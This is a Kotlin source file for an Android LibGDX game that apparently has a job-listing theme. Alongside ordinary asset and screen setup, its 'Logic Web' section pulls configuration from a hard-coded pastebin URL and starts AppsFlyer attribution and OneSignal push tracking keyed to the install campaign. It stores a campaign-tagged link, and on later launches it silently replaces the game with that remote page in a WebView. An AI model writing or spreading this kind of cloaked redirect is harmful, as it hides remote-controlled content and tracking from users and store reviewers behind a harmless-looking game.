package com.jobzone.cobzone.game

import android.content.SharedPreferences
import androidx.appcompat.app.AppCompatActivity.MODE_PRIVATE
import androidx.collection.emptyLongSet
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.appsflyer.attribution.AppsFlyerRequestListener
import com.badlogic.gdx.assets.AssetManager
import com.badlogic.gdx.utils.Disposable
import com.badlogic.gdx.utils.ScreenUtils
import com.jobzone.cobzone.MainActivity
import com.jobzone.cobzone.appContext
import com.jobzone.cobzone.game.manager.MusicManager
import com.jobzone.cobzone.game.manager.NavigationManager
import com.jobzone.cobzone.game.manager.SoundManager
import com.jobzone.cobzone.game.manager.SpriteManager
import com.jobzone.cobzone.game.manager.util.MusicUtil
import com.jobzone.cobzone.game.manager.util.SoundUtil
import com.jobzone.cobzone.game.manager.util.SpriteUtil
import com.jobzone.cobzone.game.screens.LoaderScreen
import com.jobzone.cobzone.game.screens.RespondScreen
import com.jobzone.cobzone.game.screens.VacancyScreen
import com.jobzone.cobzone.game.utils.GameColor
import com.jobzone.cobzone.game.utils.advanced.AdvancedGame
import com.jobzone.cobzone.game.utils.disposeAll
import com.jobzone.cobzone.game.utils.runGDX
import com.jobzone.cobzone.util.log
import com.onesignal.OneSignal
import kotlinx.coroutines.*
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.atomic.AtomicBoolean

class GDXGame(val activity: MainActivity) : AdvancedGame() {

    lateinit var assetManager     : AssetManager      private set
    lateinit var navigationManager: NavigationManager private set
    lateinit var spriteManager    : SpriteManager     private set
    lateinit var musicManager     : MusicManager      private set
    lateinit var soundManager     : SoundManager      private set

    val assetsLoader by lazy { SpriteUtil.Loader() }
    val assetsAll    by lazy { SpriteUtil.All() }

    val musicUtil by lazy { MusicUtil()    }
    val soundUtil by lazy { SoundUtil()    }

    var backgroundColor = GameColor.backgroundWhite
    val disposableSet   = mutableSetOf<Disposable>()

    val coroutine = CoroutineScope(Dispatchers.Default)

    val sharedPreferences: SharedPreferences = activity.getSharedPreferences("SHARED_PREF", MODE_PRIVATE)

    var isGame = false

    override fun create() {
        navigationManager = NavigationManager(this)
        assetManager      = AssetManager()
        spriteManager     = SpriteManager(assetManager)

        musicManager      = MusicManager(assetManager)
        soundManager      = SoundManager(assetManager)

        navigationManager.navigate(LoaderScreen::class.java.name)
        startJob()
    }

    override fun render() {
        ScreenUtils.clear(backgroundColor)
        super.render()
    }

    override fun dispose() {
        try {
            log("dispose LibGDXGame")
            coroutine.cancel()
            disposableSet.disposeAll()
            disposeAll(assetManager, musicUtil)
            super.dispose()
        } catch (e: Exception) { log("exception: ${e.message}") }
    }

    // Logic Web ---------------------------------------------------------------------------

    private fun startJob() {
        log("startJob")
        activity.blockRedirect = {
            activity.hideWebView()
            runGDX {
                if (navigationManager.isBackStackEmpty()) isGame = true
                else navigationManager.navigate(RespondScreen::class.java.name, VacancyScreen::class.java.name)
            }
        }
        activity.initWeb()

        val isJob = sharedPreferences.getString("is_Job", "no_Job") ?: "no_Job"

        try {
            if (isJob == "no_Job") {
                coroutine.launch(Dispatchers.Main) {
                    val jobJSON = withContext(Dispatchers.IO) { requestGet() }

                    if (jobJSON != null) {
                        AppsFlyerLib.getInstance().init(jobJSON.flr, getAppsFlyerConversionListener(jobJSON.olaf, jobJSON.kel), appContext)
                        AppsFlyerLib.getInstance().start(activity, jobJSON.flr, getAppsFlyerRequestListener())
                    } else {
                        isGame = true
                    }
                }
            } else {
                activity.showUrl(isJob)
            }
        } catch (e: Exception) {
            log("error: ${e.message}")
            isGame = true
        }
    }

    private suspend fun requestGet() = CompletableDeferred<GetJSON?>().also { continuation ->
        val urlString = "https://pastebin.com/raw/KT7QqQwP"

        try {
            val url        = URL(urlString)
            val connection = url.openConnection() as HttpURLConnection

            connection.requestMethod           = "GET"
            connection.connectTimeout          = 5000
            connection.readTimeout             = 5000
            connection.instanceFollowRedirects = true

            val responseCode = connection.responseCode

            if (responseCode == HttpURLConnection.HTTP_OK) {
                val reader = BufferedReader(InputStreamReader(connection.inputStream))
                val response = StringBuilder()
                var line: String?

                while (reader.readLine().also { line = it } != null) {
                    response.append(line)
                }
                reader.close()

                val jsonResponse = JSONObject(response.toString())
                log("json = $jsonResponse")

                val getJSON = GetJSON(
                    olaf = jsonResponse.getString("olaf") ?: "",
                    flr  = jsonResponse.getString("flr")  ?: "",
                    kel  = jsonResponse.getString("kel")  ?: "",
                )
                continuation.complete(getJSON)

            } else {
                log("Запит не успішний. Код відповіді: $responseCode")
                continuation.complete(null)
            }
            connection.disconnect()
        } catch (e: Exception) {
            log("Error: ${e.message}")
            e.printStackTrace()
            continuation.complete(null)
        }
    }.await()

    private data class GetJSON(val olaf: String, val flr: String, val kel: String)

    private fun getAppsFlyerConversionListener(olaf: String, kel: String) = object : AppsFlyerConversionListener {
        private val isAppsflyerGetData = AtomicBoolean(false)

        override fun onConversionDataSuccess(appfMap: MutableMap<String, Any>?) {
            if (isAppsflyerGetData.getAndSet(true)) return

            if (appfMap != null) {
                val campaign = appfMap["campaign"]     as? String
                val afAd     = appfMap["af_ad"]        as? String
                val media    = appfMap["media_source"] as? String

                log("Result: campaign = $campaign | afAd = $afAd | media_source = $media | appfMap = $appfMap")

                val link = "$olaf?joca=$campaign&joaf=$afAd&jomedi=$media"
                log("link = $link")

                // OneSignal
                if (campaign != null) {
                    coroutine.launch(Dispatchers.Main) {
                        OneSignal.initWithContext(activity, kel)
                        OneSignal.login(campaign)
                        withContext(Dispatchers.IO) { OneSignal.Notifications.requestPermission(false) }
                    }
                }

                coroutine.launch(Dispatchers.IO) { sharedPreferences.edit().putString("is_Job", link).apply() }

                //activity.showUrl(link)
                isGame = true

            } else isGame = true
        }

        override fun onConversionDataFail(p0: String?) {
            if (isAppsflyerGetData.getAndSet(true)) return
            isGame = true
        }

        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {}
        override fun onAttributionFailure(p0: String?) {}
    }

    private fun getAppsFlyerRequestListener() = object : AppsFlyerRequestListener {
        override fun onSuccess() {
            log("AppsFlyer: onSuccess")
        }

        override fun onError(p0: Int, p1: String) {
            log("AppsFlyer: onError")
        }
    }

}